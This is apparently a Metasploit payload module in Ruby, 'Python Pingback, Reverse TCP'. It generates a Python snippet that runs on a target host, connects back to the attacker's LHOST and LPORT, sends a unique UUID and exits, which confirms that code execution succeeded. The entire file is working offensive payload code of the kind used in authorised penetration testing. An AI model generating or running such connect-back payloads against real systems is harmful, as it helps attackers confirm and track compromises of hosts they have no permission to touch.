require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/python'

require 'msf/base/sessions/pingback'
require 'msf/core/payload/pingback'

module MetasploitModule

  CachedSize = 184

  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name' => 'Python Pingback, Reverse TCP (via python)',
      'Description' => 'Connects back to the attacker, sends a UUID, then terminates',
      'Author' => 'asoto-r7',
      'License' => MSF_LICENSE,
      'Platform' => 'python',
      'Arch' => ARCH_PYTHON,
      'Handler' => Msf::Handler::ReverseTcp,
      'Session' => Msf::Sessions::Pingback,
      'PayloadType' => 'python'
    ))
  end

  def generate
    super + command_string
  end

  def command_string
    self.pingback_uuid ||= generate_pingback_uuid

    cmd = "import socket as s\n"
    cmd << "so=s.socket(s.AF_INET,s.SOCK_STREAM)\n"
    cmd << "try:\n"
    cmd << " so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
    cmd << " so.send('#{self.pingback_uuid.gsub('-', '')}'.decode('hex'))\n"
    cmd << " so.close()\n"
    cmd << "except:\n"
    cmd << " pass\n"
    cmd
  end
end
